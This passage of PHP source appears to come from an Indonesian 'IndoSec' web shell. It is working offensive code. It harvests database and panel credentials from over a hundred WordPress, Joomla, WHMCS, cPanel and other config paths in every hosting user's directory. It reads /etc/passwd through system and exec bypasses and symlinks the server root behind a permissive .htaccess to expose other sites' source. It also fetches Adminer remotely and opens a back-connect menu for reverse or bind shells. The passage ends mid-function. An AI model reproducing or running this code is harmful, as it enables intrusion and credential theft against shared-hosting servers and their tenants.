        $isi_htc = 'Options allnRequire NonenSatisfy Any';
        $htc = fopen('indosec_config/.htaccess', 'w');
        fwrite($htc, $isi_htc);
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach ($user_config[1] as $user_con) {
            $user_config_dir = "/home/$user_con/public_html/";
            if (is_readable($user_config_dir)) {
                $grab_config = [
                    "/home/$user_con/.my.cnf" => 'cpanel',
                    "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
                    "/home/$user_con/public_html/forum/config.php" => 'phpBB',
                    "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
                    "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
                    "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
                    "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
                    "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
                    "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
                    "/home/$user_con/public_html/inc/config.php" => 'MyBB',
                    "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
                    "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
                    "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
                    "/home/$user_con/public_html/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/submitticket.php" => '^WHMCS',
                    "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
                    "/home/$user_con/public_html/WHMCS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmcs1/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/WHMC/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Whmc/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whmc/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/WHM/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Whm/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/whm/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/HOST/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Host/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/host/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SUPPORTES/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Supportes/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/supportes/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/domains/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/domain/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Hosting/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/HOSTING/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/hosting/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CART/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Cart/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/cart/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/ORDER/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Order/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/order/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Client/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/client/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Clientarea/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clientarea/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SUPPORT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Support/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/support/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILLING/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Billing/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/billing/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BUY/sumitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Buy/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/buy/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/MANAGE/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Manage/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/manage/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/ClientSupport/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Clientsupport/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clientsupport/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CHECKOUT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Checkout/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/checkout/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BASKET/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Basket/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/basket/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SECURE/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Secure/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/secure/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/SALES/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Sales/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/sales/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILL/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Bill/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/bill/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/PURCHASE/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Purchase/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/purchase/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/ACCOUNT/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Account/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/account/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/USER/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/User/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/user/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/CLIENTS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Clients/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clients/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/MY/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/My/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/my/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/secure/whm/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/secure/whmcs/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/panel/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/clientes/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/cliente/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/support/order/submitticket.php" => 'WHMCS',
                    "/home/$user_con/public_html/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/boxbilling/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/box/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/host/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/Host/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/supportes/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/support/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/hosting/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/cart/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/order/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/client/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/clients/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/cliente/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/clientes/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/billing/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/billings/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/my/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/secure/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/support/order/bb-config.php" => 'BoxBilling',
                    "/home/$user_con/public_html/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/zencart/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/products/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/cart/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/shop/includes/dist-configure.php" => 'Zencart',
                    "/home/$user_con/public_html/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/hostbills/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/host/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/support/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/hosting/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/cart/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/order/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/client/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/clients/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/cliente/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/clientes/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/billing/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/billings/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/my/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',
                    "/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
                ];
                foreach ($grab_config as $config => $nama_config) {
                    $ambil_config = file_get_contents($config);
                    if ($ambil_config == '') {
                    } else {
                        $file_config = fopen("indosec_config/$user_con-$nama_config.txt", 'w');
                        fwrite($file_config, $ambil_config);
                    }
                }
            }
        }
        echo "<p class='text-center'>Success Get Config!!</p>
        <a href='?dir=$dir/indosec_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
    } else {
        echo "<form method='post'>
            <p class='text-danger'>/etc/passwd error ?  <a href='?dir=$dir&aksi=passwbypass'>Bypass Here</a></p>
            <textarea name='passwd' class='form-control' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
            <input type='submit' class='btn btn-danger btn-block' value='Get Config!!'>
        </form>";
    }
    exit;
}
function aksiBypasswd($dir, $file) {
    echo '<div claas="container">
        <form method="POST">
            <p class="text-center">Bypass etc/passwd With :</p>
            <div class="d-flex justify-content-center flex-wrap">
                <input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
                <input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
                <input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
                <input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
                <input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
            </div><hr/>
            <p class="text-center">Bypass User With :</p>
            <div class="d-flex justify-content-center flex-wrap">
                <input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
                <input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
                <input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser">    
                <input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">        
                <input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
            </div>
        </form>';
    $mail = 'ls /var/mail';
    $paswd = '/etc/passwd';
    if ($_POST['syst']) {
        echo"<textarea class='form-control' rows='13'>";
        echo system("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['passth']) {
        echo"<textarea class='form-control' rows='13'>";
        echo passthru("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['ex']) {
        echo"<textarea class='form-control' rows='13'>";
        echo exec("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['shex']) {
        echo"<textarea class='form-control' rows='13'>";
        echo shell_exec("cat $paswd");
        echo'</textarea><br/>';
    }
    if ($_POST['melex']) {
        echo"<textarea class='form-control' rows='13'>";
        for ($uid = 0; $uid < 6000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo 'n';
            }
        }
        echo'</textarea><br/>';
    }

    if ($_POST['awkuser']) {
        echo"<textarea class='form-control' rows='13'>
                ".shell_exec("awk -F: '{ print $1 }' $paswd | sort").'
            </textarea><br/>';
    }
    if ($_POST['systuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo system("$mail");
        echo '</textarea><br>';
    }
    if ($_POST['passthuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo passthru("$mail");
        echo '</textarea><br>';
    }
    if ($_POST['exuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo exec("$mail");
        echo '</textarea><br>';
    }
    if ($_POST['shexuser']) {
        echo"<textarea class='form-control' rows='13'>";
        echo shell_exec("$mail");
        echo '</textarea><br>';
    }
    echo '</div>';
    exit;
}
function aksiAdminer($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, 'w');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);

        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('adminer.php')) {
        echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
    } else {
        if (adminer('https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php', 'adminer.php')) {
            echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
        } else {
            echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
        }
    }
    exit;
}
function aksiSym($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    $d0mains = @file('/etc/named.conf');
    if (!$d0mains) {
        die("[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
    }
    //#htaccess
    if ($d0mains) {
        @mkdir('indosec_sym', 0777);
        @chdir('indosec_sym');
        @exe('ln -s / root');
        $file3 = 'Options Indexes FollowSymLinks
        DirectoryIndex indsc.html
        AddType text/plain php html php5 phtml
        AddHandler text/plain php html php5 phtml
        Satisfy Any';
        $fp3 = fopen('.htaccess', 'w');
        $fw3 = fwrite($fp3, $file3);
        @fclose($fp3);
        echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
        <div class='tmp'>
        <table class='text-center table-responsive'>
            <thead class='bg-info'>
                <th>No.</th>
                <th>Domains</th>
                <th>Users</th>
                <th>symlink </th>
            </thead>";
        $dcount = 1;
        foreach ($d0mains as $d0main) {
            if (eregi('zone', $d0main)) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domains[1][0]));
                    echo '<tr>
                            <td>'.$dcount."</td>
                            <td class='text-left'><a href=http://www.".$domains[1][0].'/>'.$domains[1][0].'</a></td>
                            <td>'.$user['name']."</td>
                            <td><a href='$full/indosec_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
                        </tr>";
                    flush();
                    $dcount++;
                }
            }
        }
        echo '</table></div>';
    } else {
        $TEST = @file('/etc/passwd');
        if ($TEST) {
            @mkdir('indosec_sym', 0777);
            @chdir('indosec_sym');
            @exe('ln -s / root');
            $file3 = 'Options Indexes FollowSymLinks
            DirectoryIndex indsc.html
            AddType text/plain php html php5 phtml
            AddHandler text/plain php html php5 phtml
            Satisfy Any';
            $fp3 = fopen('.htaccess', 'w');
            $fw3 = fwrite($fp3, $file3);
            @fclose($fp3);
            echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
            <div class='tmp'>
            <table class='text-center table-responsive'>
                <thead class='bg-warning'>
                    <th>No.</th>
                    <th>Users</th>
                    <th>symlink </th>
                </thead>";
            $dcount = 1;
            $file = fopen('/etc/passwd', 'r') or exit('Unable to open file!');
            while (!feof($file)) {
                $s = fgets($file);
                $matches = [];
                $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                $matches = str_replace('home/', '', $matches[1]);
                if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == 'bin' || $matches == 'etc/X11/fs' || $matches == 'var/lib/nfs' || $matches == 'var/arpwatch' || $matches == 'var/gopher' || $matches == 'sbin' || $matches == 'var/adm' || $matches == 'usr/games' || $matches == 'var/ftp' || $matches == 'etc/ntp' || $matches == 'var/www' || $matches == 'var/named') {
                    continue;
                }
                echo '<tr>
                        <td>'.$dcount.'</td>
                        <td>'.$matches."</td>
                        <td><a href=$full/indosec_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
                    </tr>";
                $dcount++;
            }
            fclose($file);
            echo '</table></div>';
        } else {
            $os = explode(' ', php_uname());
            if ($os[0] != 'Windows') {
                @mkdir('indosec_sym', 0777);
                @chdir('indosec_sym');
                @exe('ln -s / root');
                $file3 = 'Options Indexes FollowSymLinks
            DirectoryIndex indsc.html
            AddType text/plain php html php5 phtml
            AddHandler text/plain php html php5 phtml
            Satisfy Any';
                $fp3 = fopen('.htaccess', 'w');
                $fw3 = fwrite($fp3, $file3);
                @fclose($fp3);
                echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
            <div class='tmp'><table class='text-center table-responsive'>
                <thead class='bg-danger'>
                    <th>ID.</th>
                    <th>Users</th>
                    <th>symlink </th>
                </thead>";
                $temp = '';
                $val1 = 0;
                $val2 = 1000;
                for (; $val1 <= $val2; $val1++) {
                    $uid = @posix_getpwuid($val1);
                    if ($uid) {
                        $temp .= implode(':', $uid)."\n";
                    }
                }
                echo '<br/>';
                $temp = trim($temp);
                $file5 = fopen('test.txt', 'w');
                fwrite($file5, $temp);
                fclose($file5);
                $dcount = 1;
                $file =
                fopen('test.txt', 'r') or exit('Unable to open file!');
                while (!feof($file)) {
                    $s = fgets($file);
                    $matches = [];
                    $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                    $matches = str_replace('home/', '', $matches[1]);
                    if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == 'bin' || $matches == 'etc/X11/fs' || $matches == 'var/lib/nfs' || $matches == 'var/arpwatch' || $matches == 'var/gopher' || $matches == 'sbin' || $matches == 'var/adm' || $matches == 'usr/games' || $matches == 'var/ftp' || $matches == 'etc/ntp' || $matches == 'var/www' || $matches == 'var/named') {
                        continue;
                    }
                    echo '<tr>
                        <td>'.$dcount.'</td>
                        <td>'.$matches."</td>
                        <td><a href=$full/indosec_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
                    </tr>";
                    $dcount++;
                }
                fclose($file);
                echo '</table></div>';
                unlink('test.txt');
            }
        }
    }
    exit;
}
function aksiSymread($dir, $file) {
    echo "read /etc/named.conf
    <form method='post' action='?dir=$dir&aksi=symread&save=1'>
    <textarea class='form-control' rows='13' name='file'>";
    flush();
    flush();
    $file = '/etc/named.conf';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $sm = @symlink($file, 'sym.txt');
        if ($sm) {
            $r3ad = @fopen('indosec_sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo ''.htmlentities($content).'';
        }
    }
    echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
    if (isset($_GET['save'])) {
        $cont = stripcslashes($_POST['file']);
        $f = fopen('named.txt', 'w');
        $w = fwrite($f, $cont);
        if ($w) {
            echo '<br/>save has been successfully';
        }
        fclose($f);
    }
    exit;
}
function sym404($dir, $file) {
    $cp = get_current_user();
    if ($_POST['execute']) {
        @rmdir('indosec_sym404');
        @mkdir('indosec_sym404', 0777);
        $dir = $_POST['dir'];
        $isi = $_POST['isi'];
        @system('ln -s '.$dir.'indosec_sym404/'.$isi);
        @symlink($dir, 'indosec_sym404/'.$isi);
        $inija = fopen('indosec_sym404/.htaccess', 'w');
        @fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
        echo'<a href="/indosec_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
    } else {
        echo '<h2>Symlink 404</h2>
        <form method="post">
            File Target: <input type="text" class="form-control" name="dir" value="/home/'.$cp.'/public_html/wp-config.php"><br/>
            Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
            <input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
            <p class="text-muted">NB: Letak wp-config tidak semuanya berada di <u>public_html/wp-config.php</u> jadi silahkan ubah sesuai letaknya.</p>
        </form>';
    }
    exit;
}
function symBypass($dir, $file) {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
    $pageFTP = 'ftp://'.$_SERVER['SERVER_NAME'].'/public_html/'.$_SERVER['REQUEST_URI'];
    $u = explode('/', $pageFTP);
    $pageFTP = str_replace($u[count($u) - 1], '', $pageFTP);
    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
        $cont = stripcslashes($_POST['file']);
        if (!file_exists('passwd.txt')) {
            $f = @fopen('passwd.txt', 'w');
            $w = @fwrite($f, $cont);
            fclose($f);
        }
        if ($w or @filesize('passwd.txt') > 0) {
            echo "<div class='tmp'>
            <table width='100%' class='text-center table-responsive mb-4'>
                <thead class='bg-info'>
                    <th>Users</th>
                    <th>symlink</th>
                    <th>FTP</th>
                </thead>";
            flush();
            $fil3 = file('passwd.txt');
            foreach ($fil3 as $f) {
                $u = explode(':', $f);
                $user = $u['0'];
                echo "<tr>
                        <td class='text-left pl-1'>$user</td>
                        <td><a href='$full/sym/root/home/$user/public_html' target='_blank'>Symlink </a></td>
                        <td><a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a></td>
                    </tr>";
                flush();
                flush();
            }
            echo '</tr></table></div>';
            die();
        }
    }
    echo "read /etc/passwd <font color='red'>error ?  </font><a href='?dir=".$dir."&aksi=passwbypass'>Bypass Here</a>
    <form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
        <textarea class='form-control' rows='13' name='file'>";
    flush();
    $file = '/etc/passwd';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        for ($uid = 0; $uid < 1000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo "\n";
            }
        }
    }
    flush();
    echo "</textarea><br/>
        <input type='submit' class='btn btn-danger btn-block' value='Symlink'/>
    </form>";
    flush();
    exit;
}
function bcTool($dir, $file) {
    echo "<h4 class='text-center mb-4'>Back Connect Tools</h4>
    <form method='post'>
        <div class='row'>
            <div class='col-md-10'>
                <span>Bind port to /bin/sh [Perl]</span><br/>
                <label>Port :</label>
                <div class='form-group input-group mb-4'>
                    <input type='text' name='port' class='form-control' value='6969'>
                    <input type='submit' name='bpl' class='btn btn-danger form-control' value='Reserve'>
                </div>
                <h5>Back-Connect</h5>
                <label>Server :</label>
                <input type='text' name='server' class='form-control mb-3' placeholder='".$_SERVER['REMOTE_ADDR']."'>
                <label>Port :</label>
                <div class='form-group input-group mb-4'>
                    <input type='text' name='port' class='form-control' placeholder='443'>
                    <select class='form-control' name='backconnect'>
                        <option value='perl'>Perl</option>
                        <option value='php'>PHP</option>
                        <option value='python'>Python</option>
                        <option value='ruby'>Ruby</option>
                    </select>
                </div>
                <input type='submit' class='btn btn-danger btn-block' value='Connect'>
            </div>
        </div>
    </form>";
    if ($_POST['bpl']) {
